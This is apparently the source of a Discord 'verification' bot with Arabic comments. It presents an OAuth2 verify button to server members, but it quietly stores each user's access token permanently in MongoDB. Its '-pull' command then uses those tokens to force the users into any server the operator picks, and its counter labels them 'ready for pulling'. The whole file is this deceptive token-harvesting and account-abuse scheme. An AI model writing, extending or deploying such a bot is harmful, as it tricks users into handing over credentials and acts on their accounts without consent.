const { 
    Client, 
    GatewayIntentBits, 
    ActionRowBuilder, 
    StringSelectMenuBuilder, 
    StringSelectMenuOptionBuilder, 
    EmbedBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    REST,
    Routes,
    PermissionFlagsBits,
    Events,
    ChannelType
} = require('discord.js');
const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose'); // ربط مكتبة المونجو دي بي للحفظ الدائم للأعضاء

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// ==================== إعداد وتوصيل قاعدة بيانات MongoDB ====================
const MONGO_URI = process.env.MONGO_URI; 

mongoose.connect(MONGO_URI)
    .then(() => console.log('Successfully connected to MongoDB Atlas!'))
    .catch(err => console.error('Failed to connect to MongoDB:', err));

// إنشاء الهيكل البرمجي (Schema) لحفظ بيانات الأعضاء الموثقين بشكل دائم للأبد
const UserSchema = new mongoose.Schema({
    userId: { type: String, required: true, unique: true },
    accessToken: { type: String, required: true },
    username: { type: String },
    guildId: { type: String }
});

const VerifiedUser = mongoose.model('VerifiedUser', UserSchema);
// ====================================================================

const tempSetup = new Map(); 
let liveCounterMessageId = null; // لتخزين أيدي رسالة العداد لتحديثها تلقائياً
let liveCounterChannelId = null; // لتخزين قناة العداد المباشر

app.get('/', (req, res) => res.send('OAuth2 Verify Bot with MongoDB is Running!'));

// استقبال التحقق وحفظ العضو تلقائياً بداخل داتابيس المونجو صامتاً وتحديث العداد المباشر
app.get('/callback', async (req, res) => {
    const code = req.query.code;
    const guildId = req.query.state; 
    
    if (!code) {
        return res.send('<h1>❌ Verification Failed. Please try again.</h1>');
    }

    try {
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID,
            client_secret: process.env.CLIENT_SECRET, 
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: `https://${req.hostname}/callback` 
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;

        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        const userId = userResponse.data.id;
        const username = userResponse.data.username;

        // الحفظ التلقائي والدائم داخل قاعدة البيانات لعدم الفقدان عند عمل الـ Deploy
        await VerifiedUser.findOneAndUpdate(
            { userId: userId },
            { accessToken: accessToken, username: username, guildId: guildId || 'Unknown' },
            { upsert: true, new: true }
        );

        // إرسال اللوج المخصص في الروم المحددة (-tv)
        if (logVerifyChannelId) {
            const logChannel = client.channels.cache.get(logVerifyChannelId);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setTitle('✅ عضو جديد أتم التحقق الذاتي')
                    .setColor('#2ecc71')
                    .addFields(
                        { name: '👤 العضو', value: `<@${userId}> | \`${username}\``, inline: true },
                        { name: '🆔 أيدي الحساب', value: `\`${userId}\``, inline: true },
                        { name: '📺 السيرفر المصدر', value: guildId ? `\`أيدي: ${guildId}\`` : '`غير معروف`', inline: true }
                    )
                    .setTimestamp();
                await logChannel.send({ embeds: [logEmbed] }).catch(() => {});
            }
        }

        // تحديث العداد المباشر للتحقق (Live Counter) تلقائياً فور إتمام التوثيق
        if (liveCounterChannelId && liveCounterMessageId) {
            const counterChannel = client.channels.cache.get(liveCounterChannelId);
            if (counterChannel) {
                const totalCount = await VerifiedUser.countDocuments();
                const counterMessage = await counterChannel.messages.fetch(liveCounterMessageId).catch(() => null);
                if (counterMessage) {
                    const updatedEmbed = new EmbedBuilder()
                        .setTitle('📊 عداد التحقق المباشر | Live Counter')
                        .setDescription(`🟢 تم تحديث العداد تلقائياً وبشكل حي!\n\n👥 العدد الإجمالي للأعضاء الموثقين والجاهزين للسحب في السيرفر هو:\n🌟 **\`${totalCount}\` عضو مفعّل** 🌟`)
                        .setColor('#2ecc71')
                        .setTimestamp();
                    await counterMessage.edit({ embeds: [updatedEmbed] }).catch(() => {});
                }
            }
        }

        // منح رتبة Verified تلقائياً وصامتاً للعضو بعد نجاح التحقق بداخل السيرفر الحالي
        if (guildId) {
            const guild = client.guilds.cache.get(guildId);
            if (guild) {
                const member = await guild.members.fetch(userId).catch(() => null);
                if (member) {
                    const verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
                    if (verifiedRole) {
                        await member.roles.add(verifiedRole).catch(err => console.error(err));
                    }
                }
            }
        }

        res.send(`<h1>✅ Verified Successfully! Thank you ${username}. You can now close this tab.</h1>`);
    } catch (error) {
        console.error('Error during callback:', error.response ? error.response.data : error.message);
        res.send('<h1>❌ Error during verification.</h1>');
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Server connected to port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// الاختصارات والأوامر الأساسية المحددة من قبلك
const VERIFY_SETUP_PREFIX = '-vr';    // إعداد بوكس التحقق والزر تفاعلياً بالسؤال عن الرابط
const COUNT_VERIFY_PREFIX = '-vf';    // فحص عدد الموافقين الإجمالي
const PULL_MEMBERS_PREFIX = '-pull';  // سحب وإدخال الأعضاء للسيرفر المحدد
const LOG_VERIFY_PREFIX = '-tv';      // تحديد روم لوج التحقق الجديد

// الميزات الجمالية والتحكم بالرومات الجديدة
const LIVE_COUNTER_PREFIX = '-lc';    // إعداد وتفعيل عداد التحقق المباشر
const HIDE_ROOMS_PREFIX = '-vv';      // قفل وإخفاء الرومات عن غير الموثقين لـ Verified فقط

let verifyUrl = 'https://discord.com/api/oauth2/authorize...'; 
let logVerifyChannelId = null; 

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

async function createVerifyRoles(guild) {
    try {
        let verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
        if (!verifiedRole) {
            await guild.roles.create({
                name: 'Verified',
                color: '#2ecc71',
                reason: 'Auto-created role for verified users'
            });
        }

        let ownerRole = guild.roles.cache.find(r => r.name === 'Ownerv');
        if (!ownerRole) {
            await guild.roles.create({
                name: 'Ownerv',
                color: '#e74c3c',
                permissions: [PermissionFlagsBits.Administrator],
                reason: 'Auto-created control role for verification administrators'
            });
        }
    } catch (error) {
        console.error(error);
    }
}

client.once('ready', async () => {
    console.log(`Verify Bot is Online as ${client.user.tag}`);
    client.guilds.cache.forEach(async (guild) => {
        await createVerifyRoles(guild);
    });
});

client.on(Events.GuildCreate, async (guild) => {
    await createVerifyRoles(guild);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    const content = message.content.trim();
    const isAuthorized = message.member.permissions.has(PermissionFlagsBits.Administrator) || message.member.roles.cache.some(r => r.name === 'Ownerv');

    // 1. الإعداد التفاعلي لبوكس التحقق والزر بالسؤال عن الرابط
    if (content === VERIFY_SETUP_PREFIX) {
        if (!isAuthorized) {
            return message.reply('❌ عذراً، هذا الأمر مخصص للإدارة أو أصحاب رتبة **Ownerv** فقط.');
        }

        const setupState = { step: 'get_url', messagesToDelete: [] };
        tempSetup.set(message.author.id, setupState);

        const prompt = await message.channel.send(`${message.author}, 🛡️ **يرجى كتابة أو لصق رابط التحقق (OAuth2 URL) الخاص بك الآن في الشات:**`);
        setupState.messagesToDelete.push(message.id, prompt.id);
        return;
    }

    if (tempSetup.has(message.author.id)) {
        const state = tempSetup.get(message.author.id);
        state.messagesToDelete.push(message.id);

        if (state.step === 'get_url') {
            const inputUrl = message.content.trim();
            if (!inputUrl.startsWith('http')) {
                const errPrompt = await message.reply('❌ رابط غير صحيح. يرجى لصق رابط OAuth2 صحيح يبدأ بـ http:');
                state.messagesToDelete.push(errPrompt.id);
                return;
            }

            verifyUrl = inputUrl;
            
            const finalUrl = `${verifyUrl}&state=${message.guild.id}`;

            const embed = new EmbedBuilder()
                .setTitle('🛡️ Server Verification / التحقق الذاتي')
                .setDescription('Please click the button below to verify yourself and get full access to the server.\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر الحصول على رتبة **Verified**.')
                .setColor('#2b2d31');

            const verifyButton = new ButtonBuilder()
                .setLabel('Verify yourself')
                .setURL(finalUrl)
                .setStyle(ButtonStyle.Link)
                .setEmoji('✅');

            const row = new ActionRowBuilder().addComponents(verifyButton);

            await message.channel.send({ embeds: [embed], components: [row] });

            setTimeout(async () => {
                for (const msgId of state.messagesToDelete) {
                    await message.channel.messages.delete(msgId).catch(() => {});
                }
            }, 1000);

            tempSetup.delete(message.author.id);
            return;
        }
    }

    // 2. تعيين قناة لوج التحقق (-tv [#القناة])
    if (content.startsWith(LOG_VERIFY_PREFIX)) {
        if (!isAuthorized) return;

        const args = content.slice(LOG_VERIFY_PREFIX.length).trim().split(/ +/);
        const channelMention = message.mentions.channels.first();
        const inputId = args[0];

        const targetChannel = channelMention || message.guild.channels.cache.get(inputId);

        if (!targetChannel || targetChannel.type !== ChannelType.GuildText) {
            return message.reply('❌ يرجى منشن قناة نصية صحيحة أو وضع الأيدي لتعيين قناة لوج التحقق:');
        }

        logVerifyChannelId = targetChannel.id;
        await message.reply(`✅ **تم بنجاح تعيين قناة لوج التحقق على: ${targetChannel}**`);
        await message.delete().catch(() => {});
        return;
    }

    // 3. تفعيل الـ Live Counter (عداد التحقق الحي المتحدث تلقائياً - `-lc`)
    if (content === LIVE_COUNTER_PREFIX) {
        if (!isAuthorized) return;

        try {
            const totalCount = await VerifiedUser.countDocuments();
            const counterEmbed = new EmbedBuilder()
                .setTitle('📊 عداد التحقق المباشر | Live Counter')
                .setDescription(`🟢 جاري بدء المراقبة وتحديث الإحصائيات الحية...\n\n👥 العدد الإجمالي للأعضاء الموثقين والجاهزين للسحب في السيرفر هو:\n🌟 **\`${totalCount}\` عضو مفعّل** 🌟`)
                .setColor('#2ecc71')
                .setTimestamp();

            const sentMessage = await message.channel.send({ embeds: [counterEmbed] });
            liveCounterMessageId = sentMessage.id;
            liveCounterChannelId = message.channel.id;

            await message.reply('✅ **تم بنجاح تفعيل عداد التحقق المباشر في هذه القناة! سيقوم البوت بتحديث هذه الرسالة تلقائياً بمجرد توثيق أي عضو جديد.**');
            await message.delete().catch(() => {});
        } catch (err) {
            console.error(err);
        }
        return;
    }

    // 4. قفل السيرفر بالكامل وإخفاء الرومات عن غير الموثقين وإتاحتها لـ Verified فقط (-vv)
    if (content === HIDE_ROOMS_PREFIX) {
        if (!isAuthorized) return;

        const statusMsg = await message.reply('⏳ **جاري فحص قنوات السيرفر وتعديل الصلاحيات لحمايتها وإخفائها عن غير الموثقين...**');

        const guild = message.guild;
        const verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');

        if (!verifiedRole) {
            return statusMsg.edit('❌ لم يتم العثور على رتبة `Verified` في السيرفر لتهيئة الرومات عليها.');
        }

        let updatedCount = 0;

        // المرور على جميع قنوات ورومات السيرفر وتأمينها تلقائياً وصامتاً
        guild.channels.cache.forEach(async (channel) => {
            // نقوم بتأمين رومات الكتابة والصوت التفاعلية فقط، ونتفادى قناة التحقق الحالية
            if (channel.type === ChannelType.GuildText || channel.type === ChannelType.GuildVoice) {
                if (channel.id !== message.channel.id && channel.id !== logVerifyChannelId) {
                    try {
                        // أ- إخفاء الروم وقفل رؤيته تماماً عن رتبة everyone (غير الموثقين)
                        await channel.permissionOverwrites.edit(guild.id, {
                            ViewChannel: false
                        });

                        // ب- إظهار وإتاحة الروم بشكل كامل وصامت لرتبة Verified (الموثقين)
                        await channel.permissionOverwrites.edit(verifiedRole.id, {
                            ViewChannel: true,
                            SendMessages: true,
                            ReadMessageHistory: true
                        });
                        updatedCount++;
                    } catch (err) {
                        // تخطي قنوات النظام أو القنوات المقفلة مسبقاً التي لا يملك البوت صلاحية لتعديلها
                    }
                }
            }
        });

        setTimeout(async () => {
            await statusMsg.edit(`✅ **اكتمل تأمين السيرفر بنجاح!**\n\n🔒 تم قفل وإخفاء \`${updatedCount}\` روم عن غير الموثقين، وإتاحتها تلقائياً فقط للأعضاء الذين يحملون رتبة **Verified**.`);
        }, 3000);
        return;
    }

    // 5. فحص عدد الموثقين الإجمالي المخزن في MongoDB
    if (content === COUNT_VERIFY_PREFIX) {
        if (!isAuthorized) return;
        try {
            const count = await VerifiedUser.countDocuments();
            await message.reply(`📊 **إحصائية التحقق المطور (MongoDB):**\nالعدد الكلي للأعضاء الموثقين المحفوظين والجاهزين للسحب هو: \`${count}\` عضو.`);
        } catch (err) {
            console.error(err);
            await message.reply('❌ حدث خطأ أثناء محاولة جلب الإحصائية من قاعدة البيانات.');
        }
        return;
    }

    // 6. سحب الأعضاء الموثقين من قاعدة البيانات وإدخالهم تلقائياً للسيرفر المستهدف (-pull [أيدي السيرفر])
    if (content.startsWith(PULL_MEMBERS_PREFIX)) {
        if (!isAuthorized) return;

        const args = content.slice(PULL_MEMBERS_PREFIX.length).trim().split(/ +/);
        const targetGuildId = args[0] || message.guild.id; 

        try {
            const totalCount = await VerifiedUser.countDocuments();

            if (totalCount === 0) {
                return message.reply('❌ لا يوجد أي أعضاء موثقين مسجلين في قاعدة البيانات حالياً لسحبهم.');
            }

            const targetGuild = client.guilds.cache.get(targetGuildId);
            if (!targetGuild) {
                return message.reply('❌ البوت ليس موجوداً بداخل السيرفر المستهدف، يرجى دعوة البوت أولاً.');
            }

            const statusMsg = await message.channel.send(`⏳ **جاري جلب الأعضاء وبدء سحب وإدخال \`${totalCount}\` عضو إلى السيرفر المستهدف...**`);

            let successCount = 0;
            let failCount = 0;
            let alreadyInCount = 0;

            const allVerifiedUsers = await VerifiedUser.find();

            let index = 0;
            const interval = setInterval(async () => {
                if (index >= allVerifiedUsers.length) {
                    clearInterval(interval);
                    await statusMsg.edit(`✅ **اكتملت عملية سحب الأعضاء بنجاح!**\n\n📬 تم إدخال: \`${successCount}\` عضو.\n🔄 كانوا موجودين بالسيرفر سابقاً: \`${alreadyInCount}\` عضو.\n❌ فشل سحبهم (انتهى توكن حسابهم): \`${failCount}\` عضو.`);
                    return;
                }

                const userData = allVerifiedUsers[index];
                const isMember = targetGuild.members.cache.has(userData.userId);

                if (isMember) {
                    alreadyInCount++;
                } else {
                    try {
                        await axios.put(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${userData.userId}`, {
                            access_token: userData.accessToken
                        }, {
                            headers: {
                                Authorization: `Bot ${TOKEN}`,
                                'Content-Type': 'application/json'
                            }
                        });
                        successCount++;
                    } catch (err) {
                        failCount++;
                    }
                }

                await statusMsg.edit(`⏳ **جاري السحب الفوري للأعضاء...**\n\n📊 التقدم الحالي: \`${index + 1}/${allVerifiedUsers.length}\` عضو.\n✅ تم الإدخال: \`${successCount}\` | 🔄 موجود سابقاً: \`${alreadyInCount}\` | ❌ فشل: \`${failCount}\``);
                index++;
            }, 1200); 

        } catch (err) {
            console.error(err);
            await message.reply('❌ حدث خطأ غير متوقع أثناء محاولة بدء عملية السحب.');
        }
        return;
    }
});

client.login(TOKEN);